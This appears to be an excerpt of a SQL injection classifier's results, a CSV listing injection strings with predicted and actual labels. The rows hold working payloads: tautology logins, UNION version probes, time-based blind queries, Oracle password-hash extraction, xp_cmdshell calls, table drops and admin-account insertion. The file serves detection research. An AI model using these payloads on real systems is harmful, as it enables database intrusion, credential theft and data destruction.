,Query,Prediction,Actual
359," select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,1.0
360," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,1.0
361,declare @s varchar  (  200  )   select @s   =   0x77616974 ...,1,1.0
362,x' AND userid IS NULL; --,1,1.0
363," select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,1.0
364," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,1.0
365," select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,1.0
366," select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,1.0
367, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,1.0
368," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1.0
369,select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,1.0
370," select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,1.0
371," select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,1.0
372,UNION ALL SELECT,1,1.0
373," select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,1.0
374,select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,1.0
375," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1.0
376,x' or full_name like '%bob%,1,1.0
377,x' and members.email is NULL; --,1,1.0
378, or 2 > 1,1,1.0
379,select * from users where id  =  1.*1 or 1  =  1 -- 1,1,1.0
380,"""  )   or pg_sleep  (  __TIME__  )  --",1,1.0
381, ',0,1.0
382," select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1,1.0
383," select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,1.0
384,select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1,1.0
385, )   or sleep  (  __TIME__  )    =  ',1,1.0
386,sleep 50',1,1.0
387," select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1.0
388,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,1.0
389," select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,1.0
390,or sleep  (  __TIME__  )    =  ',1,1.0
391," select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,1.0
392," select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,1.0
393," select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,1.0
394," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,1.0
395," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,1.0
396,or 2 > 1,1,1.0
397,; exec   (  'sel' + 'ect us' + 'er'  ) ,0,1.0
398,anything' OR 'x'  =  'x,1,1.0
399," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,1.0
400," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,1.0
401," select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1,1.0
402,&',0,1.0
403,a' or 3  =  3--,1,1.0
404," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,1.0
405," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1.0
406,"admin""or 1  =  1 or """"  =  """,1,1.0
407,uni/**/on sel/**/ect,0,1.0
408,""" or """"&""",1,1.0
409, )    )   ;waitfor delay '0:0:__TIME__'--,1,1.0
410," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,1.0
411,1 waitfor delay '0:0:10'--,1,1.0
412,bfilename,0,1.0
413,admin'  )   or   (  '1'  =  '1'--,1,1.0
414,UEf,0,1.0
415, -- &password  = ,1,1.0
416,1 or sleep  (  __TIME__  )  #,1,1.0
417," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,1.0
418," select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,1.0
419," select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,1.0
420,1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,1,1.0
421,or sleep  (  __TIME__  )  #,1,1.0
422," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,1.0
423," select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,1.0
424,||6,0,1.0
425,or 1/*,1,1.0
426," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1,1.0
427,select * from users where id  =  1.%@ or 1  =  1 -- 1,1,1.0
428," select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,1.0
429," select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1,1.0
430," select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1,1.0
431," or 1  =  1 or """"  =  ",1,1.0
432," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,1.0
433,select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1,1.0
434," select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,1.0
435,or 'whatever' in   (  'whatever'  ) ,1,1.0
436,declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,1,1.0
437,select * from users where id  =  '1'   or 1  =  1 -- 1',1,1.0
438,?,0,1.0
439, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1,1.0
440," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1,1.0
441,"admin""  )   or   (  ""1""  =  ""1""#",1,1.0
442," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1,1.0
443," select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1,1.0
444, or '' ',1,1.0
445," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1,1.0
446,or 1  =  1,1,1.0
447, ; drop table temp --,1,1.0
448," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1.0
449,""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,1.0
450,""" or ""x""  =  ""x",1,1.0
451,select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1,1.0
452," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,1.0
453, or 'something' like 'some%',1,1.0
454,; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1,1.0
455," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,1.0
456,select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1,1.0
457,; exec master..xp_cmdshell 'ping 10.10.1.2'--,0,1.0
458,admin' or '1'  =  '1'--,1,1.0
459,; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,1,1.0
460," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,1.0
461," select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1,1.0
462," select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1,1.0
463,""";waitfor delay '0:0:__TIME__'--",1,1.0
464,x' and userid is NULL; --,1,1.0
465,select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,1.0
466," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,1.0
467," select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1,1.0
468,’ or ‘1’  =  ’1,1,1.0
469," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,1.0
470,admin'or 1  =  1 or ''  =  ',1,1.0
471," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,1.0
472," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1,1.0
473,exec  (  @s  ) ,1,1.0
474," select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,1.0
475," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1,1.0
476, or 1  =  1,1,1.0
477,select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1,1.0
478," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,1.0
479,x' AND email IS NULL; --,1,1.0
480," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1,1.0
481, --,0,1.0
482," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,1.0
483," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1.0
484," select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,1.0
485,update,0,1.0
486, or 1/*,1,1.0
487," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1,1.0
488,"""   )    )    or pg_sleep  (  __TIME__  )  --",1,1.0
489,||'6,0,1.0
490," select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1,1.0
491,or   (  EXISTS  ) ,1,1.0
492,^',0,1.0
493,or 'text'   =   n'text',1,1.0
494," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1,1.0
495," select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1,1.0
496," select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1,1.0
497," select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1,1.0
498, or 0  =  0 --,1,1.0
499," select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1,1.0
500," select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1,1.0
501," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1,1.0
502," select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1,1.0
503,password:*/  =  1--,1,1.0
504," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1,1.0
505," select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1,1.0
506," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1,1.0
507," union   (  select NULL,   (  select @@version   )    )    --",1,1.0
508," select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1,1.0
509," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1,1.0
510," select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1,1.0
511," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1,1.0
512," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1,1.0
513," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1,1.0
514," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1,1.0
515," select * from users where id  =  1. union select null,version  (    )   -- 1",1,1.0
516," select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1,1.0
517," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1,1.0
518, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1,1.0
519,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1,1.0
520," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,1.0
521," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1,1.0
522," select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",1,1.0
523," select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",1,1.0
524," select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",1,1.0
525,UNION SELECT,1,1.0
526,asc,0,1.0
527," || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1,1.0
528,"exec sp_addsrvrolemember 'name' , 'sysadmin'",1,1.0
529," select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1,1.0
530,  )   or true--,1,1.0
531," select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,1.0
532," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,1.0
533, or userid like '%,1,1.0
534," union   (  select NULL, NULL,   (  select @@version   )    )    --",1,1.0
535,/,0,1.0
536,select * from users where id  =  1 or $<\ or 1  =  1 -- 1,1,1.0
537,"admin""/*",1,1.0
538," select * from users where id  =  1.  union select 1,version  (    )   -- 1",1,1.0
539, )  ;waitfor delay '0:0:__TIME__'--,1,1.0
540," select * from users where id  =  1 union select @<@.,version  (    )   -- 1",1,1.0
541," select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",1,1.0
542,"admin"" or ""1""  =  ""1",1,1.0
543, union   (  select @@version  )   --,1,1.0
544, or ''^',1,1.0
545,"""   )    )    or sleep  (  __TIME__  )    =  """,1,1.0
546," union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",1,1.0
547," select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",1,1.0
548," select * from users where id  =  1 union select @ _,version  (    )   -- 1",1,1.0
549,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,1,1.0
550,select * from users where id  =  '1' <@$_ or 1  =  1 -- 1',1,1.0
551," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",1,1.0
552," select * from users where id  =  1 or ""  (  &"" or 1  =  1 -- 1",1,1.0
553,"""hi""""  )   or   (  """"a""""  =  """"a""",1,1.0
554,select name from syscolumns where id   =     (  sele ...,1,1.0
555," select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",1,1.0
556,"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 5  )   waitfor delay '0:0:2' --",1,1.0
557," select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1,1.0
558, or 2 between 1 and 3,1,1.0
559,union all select @@version--,1,1.0
560," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,1.0
561,t'exec master..xp_cmdshell 'nslookup www.google.com'--,0,1.0
562,""" or isNULL  (  1/0  )   /*",1,1.0
563," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",1,1.0
564," select * from users where id  =  1 or ""{?"" or 1  =  1 -- 1",1,1.0
565," select * from users where id  =  1 or ""{#"" or 1  =  1 -- 1",1,1.0
566,declare @q nvarchar   (  200  )   0x730065006c00650063 ...,1,1.0
567, or 'a'  =  'a,1,1.0
568, union all select @@version--,1,1.0
569," select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",1,1.0
570,"admin"" or 1  =  1/*",1,1.0
571, or   (  EXISTS  ) ,1,1.0
572," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",1,1.0
573,declare @s varchar   (  8000  )   select @s   =   0x73656c ...,1,1.0
574," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",1,1.0
575," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",1,1.0
576," select * from users where id  =  1 or "".;"" or 1  =  1 -- 1",1,1.0
577," select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",1,1.0
578,; begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >,1,1.0
579," union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",1,1.0
580,hi' or 1  =  1 --,1,1.0
581, UNION SELECT,1,1.0
582,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,1,1.0
583," select * from users where id  =  1 or 1#""  (   union select 'a',version  (    )   -- 1",1,1.0
584," select * from users where id  =  1 or ""{  )  "" or 1  =  1 -- 1",1,1.0
585," select * from users where id  =  1 or ""1["" or 1  =  1 -- 1",1,1.0
586,desc,0,1.0
587," select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",1,1.0
588,anything' or 'x'  =  'x,1,1.0
589," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",1,1.0
590,select * from users where id  =  1 + \+%\ or 1  =  1 -- 1,1,1.0
591,0x770061006900740066006F0072002000640065006C00 ...,0,1.0
592," select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",1,1.0
593," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",1,1.0
594," select * from users where id  =  1 or ""]."" or 1  =  1 -- 1",1,1.0
595," select * from users where id  =  1 or ""_;"" or 1  =  1 -- 1",1,1.0
596,or isNULL  (  1/0  )   /*,1,1.0
597,"insert into users  (  login, password, level  )   values  (   char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )   + char  (  0x70  )   + char  (  0x65  )   + char  (  0x74  )   + char  (  0x65  )   + char  (  0x72  )  ,char  (  0x64  )  ",1,1.0
598," select * from users where id  =  1 or ""  )    (  ""  =  1 or 1  =  1 -- 1",1,1.0
599," select * from users where id  =  1 or ""$@"" or 1  =  1 -- 1",1,1.0
600,"admin"" or ""1""  =  ""1""#",1,1.0
601,"admin"" or 1  =  1--",1,1.0
602, or user like '%,1,1.0
